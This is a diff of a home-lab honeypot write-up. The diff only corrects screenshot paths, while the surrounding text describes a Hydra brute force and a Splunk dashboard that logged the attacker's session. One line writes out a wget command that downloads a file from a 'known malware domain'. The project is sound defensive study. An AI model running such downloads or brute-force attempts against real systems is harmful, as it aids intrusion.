@@ -17,7 +17,7 @@ After that I SSH'd in and ran some commands to act like an attacker would:
 - `wget http://malware.testcategory.com/test` to download a test file from a known malware domain
 - `ls` to look around
 
-![Hydra brute force and post-exploitation](screenshots/brute-force/01-hydra-attack.png)
+![Hydra brute force and post-exploitation](../screenshots/brute-force/01-hydra-attack.png)
 
 ## What Splunk Picked Up
 
@@ -25,7 +25,7 @@ On the Splunk dashboard (192.168.1.111), all of this showed up right away. The f
 
 The Attack Session Deep Dive table at the bottom logs every command that was run inside the honeypot with timestamps and session IDs. You can see the `whoami`, the `wget`, the `curl`, all of it.
 
-![Splunk dashboard showing the attack](screenshots/brute-force/02-splunk-dashboard.png)
+![Splunk dashboard showing the attack](../screenshots/brute-force/02-splunk-dashboard.png)
 
 ## Attacker Profile
 
@@ -36,7 +36,7 @@ Splunk also builds a profile that ties everything together for one IP. For 192.1
 - Username targeted: `root`
 - Full list of every command that was executed
 
-![Attacker profile summary](screenshots/brute-force/03-attacker-profile.png)
+![Attacker profile summary](../screenshots/brute-force/03-attacker-profile.png)
 
 ---
 
